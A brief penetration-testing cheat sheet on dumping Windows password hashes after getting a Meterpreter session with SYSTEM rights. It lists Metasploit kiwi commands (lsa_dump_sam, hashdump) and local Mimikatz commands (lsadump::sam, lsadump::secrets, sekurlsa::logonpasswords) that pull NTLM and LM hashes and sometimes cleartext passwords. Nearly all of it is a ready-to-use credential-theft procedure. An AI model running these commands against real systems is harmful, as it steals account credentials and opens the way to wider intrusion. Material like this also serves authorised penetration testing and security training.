# Hash Dumping and Pass-the-Hash

Once a meterpreter session is gained with NT Authority rights, we can dump the passwordhashes.

First we will utilize kiwi, which is an extension of meterpreter, based on Mimikatz.

#### Kiwi Metasploit

load kiwi

? --> to open up help menu

lsa_dump_sam --> to get Administrator and all user NTLM Hashes.

hashdump --> to get the total hash LM Hash & NTLM Hash.


#### Mimikatz Locally

privilege::debug --> to check if u have privs to perform hash extraction

lsadump::sam

lsadump::secrets --> sometimes displays clear text passwords

sekurlsa::logonpasswords --> to check auth logs 

